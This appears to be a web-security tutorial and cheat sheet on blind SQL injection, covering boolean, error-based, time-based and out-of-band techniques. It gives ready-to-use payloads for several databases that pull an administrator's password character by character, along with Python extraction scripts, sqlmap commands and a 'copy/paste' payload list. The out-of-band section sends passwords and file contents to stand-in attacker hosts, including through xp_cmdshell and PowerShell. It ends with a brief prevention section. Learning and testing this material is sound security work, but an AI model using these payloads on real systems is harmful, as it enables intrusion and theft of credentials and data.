# Blind SQL injection

Blind SQLi occurs when an application is vulnerable to SQL injection but **does not return query results or error messages** in HTTP responses. You can't see database output directly, so you must infer data through indirect channels: response differences, timing delays, or out-of-band (OOB) interactions.

Blind SQLi requires more sophisticated techniques than regular SQLi but can be equally devastating, enabling complete data extraction one bit or character at a time.

> Only test systems you own or are explicitly authorized to assess.

## Why SQLi is "blind" (and what changes)

In regular SQLi, you see query results:
```sql
' UNION SELECT username, password FROM users--
```

Response shows: `admin:p@ssw0rd`

In blind SQLi, the same injection executes but you only see:
```text
Product not found
```

Or:
```text
Welcome back!
```

The data exists in the database, but the application doesn't display query results. You must extract information through **side channels**.

Common blind SQLi scenarios:
- Tracking cookies, analytics tokens
- Background logging systems
- API endpoints that return generic success/error
- Async database operations
- Hidden admin panels
- Search functionality that doesn't display results

## Exploitation techniques (four main approaches)

### 1) Boolean-based (conditional responses)
Inject conditions that cause observable behavior differences (page content, HTTP status, response length).

### 2) Error-based (conditional errors)
Trigger database errors conditionally to infer true/false.

### 3) Time-based (conditional delays)
Use SQL delay functions to infer conditions based on response time.

### 4) Out-of-band (OOB/OAST)
Make the database contact your server (DNS, HTTP, SMB) to exfiltrate data directly.

## Boolean-based blind SQLi (conditional responses)

### Concept
Inject SQL that makes the application behave differently based on a true/false condition.

### Vulnerable example: Tracking cookie
```http
GET /products HTTP/1.1
Cookie: TrackingId=xyz123
```

Backend query:
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'xyz123'
```

If TrackingId exists, page shows "Welcome back!"
If not, no message appears.

### Testing for injection
Original:
```text
Cookie: TrackingId=xyz123
Response: "Welcome back!"
```

Test true condition:
```text
Cookie: TrackingId=xyz123' AND '1'='1
Response: "Welcome back!" (condition true, query returns data)
```

Test false condition:
```text
Cookie: TrackingId=xyz123' AND '1'='2
Response: No message (condition false, query returns nothing)
```

If behavior differs, you can infer boolean conditions.

### Extracting data character-by-character

#### Step 1: Verify admin user exists
```sql
xyz' AND (SELECT 'x' FROM users WHERE username='administrator')='x'--
```

If "Welcome back" appears → admin exists
If no message → admin doesn't exist

#### Step 2: Extract password length
```sql
xyz' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>5)='x'--
xyz' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>10)='x'--
xyz' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>15)='x'--
```

Use binary search to find exact length.

#### Step 3: Extract first character
```sql
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b'--
...
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='s'--
```

When "Welcome back" appears → first character is 's'

Or use comparison for faster binary search:
```sql
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')>'m'--
```

If true, first char is in range n-z
If false, first char is in range a-m

Repeat to narrow down.

#### Step 4: Extract remaining characters
```sql
xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a'--
xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='a'--
...
```

### Database-specific substring functions
```sql
SUBSTRING(password, 1, 1)    -- SQL Server, PostgreSQL, MySQL
SUBSTR(password, 1, 1)       -- Oracle, SQLite
MID(password, 1, 1)          -- MySQL alternative
```

### Automation example (pseudocode)
```python
def extract_password(url, cookie_name):
    password = ""
    for position in range(1, 21):  # Assume max 20 chars
        for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
            payload = f"xyz' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}'--"
            response = requests.get(url, cookies={cookie_name: payload})
            if "Welcome back" in response.text:
                password += char
                break
    return password
```

## Error-based blind SQLi (conditional errors)

When page content doesn't change but errors are handled differently.

### Technique: Conditional divide-by-zero

SQL Server / PostgreSQL:
```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'--
```

First payload: triggers divide-by-zero (error in response)
Second payload: no error (normal response)

MySQL:
```sql
xyz' AND IF(1=1, (SELECT table_name FROM information_schema.tables), 'a')='a'--
```

Oracle:
```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
```

### Extracting data with conditional errors

Check if first character of password > 'm':
```sql
xyz' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM users WHERE username='administrator')='a'--
```

If error → condition true (password starts with n-z)
If no error → condition false (password starts with a-m)

### Verbose error messages (data leakage in errors)

Some misconfigured databases include data in error messages.

Payload:
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

Error message:
```text
ERROR: invalid input syntax for type integer: "s3cr3tp@ssw0rd"
```

Password revealed directly in error.

Oracle example:
```sql
' AND 1=CAST((SELECT username FROM users WHERE ROWNUM=1) AS number)--
```

SQL Server:
```sql
' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--
```

PostgreSQL:
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS integer)--
```

MySQL:
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users LIMIT 1), 0x3a, FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) y)--
```

## Time-based blind SQLi (conditional delays)

When no visible differences occur, use time delays as a side channel.

### Basic time delay (confirm SQLi exists)

SQL Server:
```sql
'; WAITFOR DELAY '0:0:5'--
```

MySQL:
```sql
'; SELECT SLEEP(5)--
' AND SLEEP(5)--
```

PostgreSQL:
```sql
'; SELECT pg_sleep(5)--
' || pg_sleep(5)--
```

Oracle:
```sql
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
```

If response takes 5+ seconds → SQLi confirmed.

### Conditional time delays

SQL Server:
```sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--    (delays)
'; IF (1=2) WAITFOR DELAY '0:0:5'--    (instant response)
```

MySQL:
```sql
' AND IF(1=1, SLEEP(5), 0)--    (delays)
' AND IF(1=2, SLEEP(5), 0)--    (instant)
```

PostgreSQL:
```sql
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

Oracle:
```sql
' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END FROM dual)=1--
```

### Extracting data with time delays

Check if admin exists:
```sql
' AND IF((SELECT COUNT(*) FROM users WHERE username='administrator')>0, SLEEP(5), 0)--
```

Delay = admin exists
Instant = admin doesn't exist

Extract first character:
```sql
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a', SLEEP(5), 0)--
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b', SLEEP(5), 0)--
...
```

When response delays → character matched.

Binary search optimization:
```sql
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')>'m', SLEEP(5), 0)--
```

### Time-based extraction automation (pseudocode)
```python
import time

def extract_char_timebased(url, position):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
        payload = f"' AND IF((SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}', SLEEP(5), 0)--"
        start = time.time()
        requests.get(url, params={'id': payload})
        elapsed = time.time() - start
        if elapsed > 5:
            return char
    return None
```

## Out-of-band (OOB/OAST) techniques

When application doesn't return results, errors, or consistent timing, make the database contact your server.

### Why OOB is powerful
- Works when all other techniques fail
- Can exfiltrate data directly (no binary search needed)
- Works with async queries
- Often bypasses WAFs (outbound DNS rarely blocked)

### DNS-based OOB (most reliable)

SQL Server (DNS via xp_dirtree):
```sql
'; exec master..xp_dirtree '//attacker.burpcollaborator.net/a'--
```

Check Burp Collaborator for DNS query.

Oracle (DNS via UTL_INADDR):
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
```

Or:
```sql
' || (SELECT UTL_INADDR.get_host_address('attacker.burpcollaborator.net') FROM dual)--
```

MySQL (DNS via LOAD_FILE):
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', 'attacker.burpcollaborator.net', '\\a'))--
```

PostgreSQL (limited, requires extensions):
```sql
' || (SELECT dblink_connect('host=attacker.burpcollaborator.net'))--
```

### OOB data exfiltration

Extract password and send via DNS:

SQL Server:
```sql
'; DECLARE @data varchar(1024);
SET @data=(SELECT password FROM users WHERE username='Administrator');
EXEC('master..xp_dirtree "//'+@data+'.attacker.burpcollaborator.net/a"')--
```

DNS query received:
```text
s3cr3tp@ssw0rd.attacker.burpcollaborator.net
```

Oracle:
```sql
' || (SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE username='Administrator')||'.attacker.burpcollaborator.net') FROM dual)--
```

MySQL:
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='Administrator'),'.attacker.burpcollaborator.net','\\a'))--
```

### HTTP-based OOB

SQL Server (HTTP request via xp_cmdshell if enabled):
```sql
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.burpcollaborator.net/$((Get-Content C:\passwords.txt))"'--
```

Oracle (HTTP via UTL_HTTP):
```sql
' || (SELECT UTL_HTTP.request('http://attacker.burpcollaborator.net/'||(SELECT password FROM users WHERE username='Administrator')) FROM dual)--
```

## Practical testing workflow (step-by-step)

### Step 1: Detect blind SQLi
```text
' AND '1'='1    (normal response)
' AND '1'='2    (different response)
```

Or:
```sql
' AND SLEEP(5)--    (delayed response)
```

### Step 2: Determine technique viability

Try boolean:
```sql
' AND (SELECT 'x')='x'--
```

Try error-based:
```sql
' AND 1=CAST('a' AS int)--
```

Try time-based:
```sql
' AND SLEEP(5)--
```

Try OOB:
```sql
'; exec master..xp_dirtree '//unique.burpcollaborator.net/a'--
```

### Step 3: Enumerate database

Check database version (boolean):
```sql
' AND (SELECT SUBSTRING(@@version,1,1))='5'--    (iterate until true)
```

Check table exists:
```sql
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

### Step 4: Extract target data

Using boolean:
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

Using time delay:
```sql
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--
```

Using OOB:
```sql
'; DECLARE @p varchar(1024); SET @p=(SELECT password FROM users WHERE username='admin'); EXEC('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
```

### Step 5: Automate extraction

Use sqlmap:
```bash
sqlmap -u "https://target.com/page?id=1" --technique=B --dump    (Boolean-based)
sqlmap -u "https://target.com/page?id=1" --technique=T --dump    (Time-based)
sqlmap -u "https://target.com/page?id=1" --dns-domain=attacker.com --dump    (OOB)
```

Or write custom script for specific context.

## Database-specific syntax reference

### Time delays:
```sql
SQL Server:   WAITFOR DELAY '0:0:5'
MySQL:        SLEEP(5)
PostgreSQL:   pg_sleep(5)
Oracle:       DBMS_PIPE.RECEIVE_MESSAGE('a',5)
```

### Conditional logic:
```sql
SQL Server:   IF (condition) statement
MySQL:        IF(condition, true_result, false_result)
PostgreSQL:   CASE WHEN (condition) THEN result END
Oracle:       CASE WHEN (condition) THEN result END
```

### OOB DNS:
```sql
SQL Server:   exec master..xp_dirtree '//domain/a'
Oracle:       UTL_INADDR.get_host_address('domain')
MySQL:        LOAD_FILE(CONCAT('\\\\','domain','\\a'))
```

## Quick payload reference (copy/paste)

Boolean-based:
```sql
' AND '1'='1--
' AND (SELECT 'x' FROM users WHERE username='admin')='x'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

Error-based:
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'--
```

Time-based:
```sql
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0)--
```

OOB:
```sql
'; exec master..xp_dirtree '//unique.burpcollaborator.net/a'--
' || UTL_INADDR.get_host_address('unique.burpcollaborator.net')--
```

## Prevention (same as regular SQLi)

Blind SQLi is prevented the same way as regular SQLi: **parameterized queries**.

```java
// Vulnerable
String query = "SELECT * FROM users WHERE id='" + userId + "'";

// Safe
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id=?");
stmt.setString(1, userId);
```

Additional mitigations:
- Disable error message display in production
- Implement response randomization (make timing attacks harder)
- Block outbound connections from database servers (prevent OOB)
- Use database firewalls to detect/block time delay functions
- Monitor for unusual query patterns (many similar requests)
